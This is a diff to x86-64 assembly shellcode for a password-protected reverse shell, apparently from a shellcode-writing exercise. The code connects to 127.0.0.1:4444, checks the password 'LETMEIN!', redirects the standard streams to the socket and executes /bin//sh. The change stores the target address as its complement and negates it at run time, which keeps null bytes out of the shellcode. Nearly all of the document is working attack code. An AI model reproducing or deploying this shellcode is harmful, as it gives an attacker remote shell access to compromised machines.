@@ -34,7 +34,11 @@ global _start
     ; Configs
     config.max_cons equ 0x2
     config.password equ 0x4d54454c214e4945  ; MTEL!NIE > LETMEIN!
+
     config.target   equ 0x100007f5c110002   ; tcp://127.0.0.1:4444
+    ; This has nullbytes, so I replaced it with its complement
+    config.target.complement equ 0xfeffff80a3eefffe  ; neg(tcp://127.0.0.1:4444)
+
 
 section .text
 
@@ -53,7 +57,8 @@ _start:
 
     ; 2 - Connect to target
     xchg rax, rdi
-    mov rcx, config.target
+    mov rcx, config.target.complement
+    neg rcx
     push rcx
     mov rsi, rsp
     push ipv4.addressLen
@@ -62,7 +67,7 @@ _start:
     pop rax
     syscall
 
-    ; Read password from the client fd
+    ; 3 - Read password from the client fd
     read_pass:
         xor rax, rax    ; read syscall == 0x00
         mov rdi, r15    ; rdi = fd
@@ -77,7 +82,7 @@ _start:
         scasq
     jne read_pass
 
-    ; 3 - Duplicate std streams
+    ; 4 - Duplicate std streams
     mov rdi, r15 ; restore socket fd into rdi
     push 0x02
     pop rsi
@@ -88,20 +93,16 @@ _start:
         dec rsi
     jns loop_through_stdfs
 
-    ; 4 - Execve
+    ; 5 - Execve
     xor rdx, rdx
-
     push rdx ; First NULL push    
     mov rbx, binshString ; push /bin//sh in reverse
     push rbx     ; store /bin//sh address in RDI
     mov rdi, rsp 
-    
     push rdx ; Second NULL push
     mov rdx, rsp
     push rdi     ; set RSI to address of /bin//sh
     mov rsi, rsp
-    
     push syscalls.execve
     pop rax
-    
     syscall
